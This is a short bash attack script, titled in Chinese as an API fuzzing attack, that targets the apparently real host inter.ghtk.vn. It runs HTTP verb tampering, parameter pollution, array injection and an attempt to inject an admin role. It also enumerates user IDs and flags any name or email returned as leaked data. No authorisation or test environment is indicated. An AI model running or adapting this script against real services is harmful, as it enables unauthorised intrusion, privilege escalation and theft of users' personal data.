#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 深度攻击2：API Fuzzing（参数注入/HTTP动词篡改）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="inter.ghtk.vn"

echo "[*] 测试1：HTTP动词篡改"
API="/api/v1/users"

for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
    echo -n "  $method $API: "
    resp=$(curl -sk "https://$TARGET$API" -X $method -m 3 2>&1)
    status=$(echo "$resp" | head -1)
    echo "$status" | grep -qE "401|403" || echo "⚠️  $status"
done

echo ""
echo "[*] 测试2：参数污染"
curl -sk "https://$TARGET/api/v1/user?id=1&id=2" -m 3 | head -10

echo ""
echo "[*] 测试3：数组注入"
curl -sk "https://$TARGET/api/v1/user?id[]=1&id[]=2" -m 3 | head -10

echo ""
echo "[*] 测试4：JSON参数注入"
curl -sk "https://$TARGET/api/v1/user" \
    -H "Content-Type: application/json" \
    -d '{"id":1,"role":"admin"}' -m 3 | head -10

echo ""
echo "[*] 测试5：IDOR（批量枚举）"
for id in {1..10}; do
    echo -n "  User ID $id: "
    resp=$(curl -sk "https://$TARGET/api/v1/user/$id" -m 3 2>&1)
    echo "$resp" | grep -qE "\"name\"|\"email\"" && echo "✅ 数据泄露！" || echo "❌"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
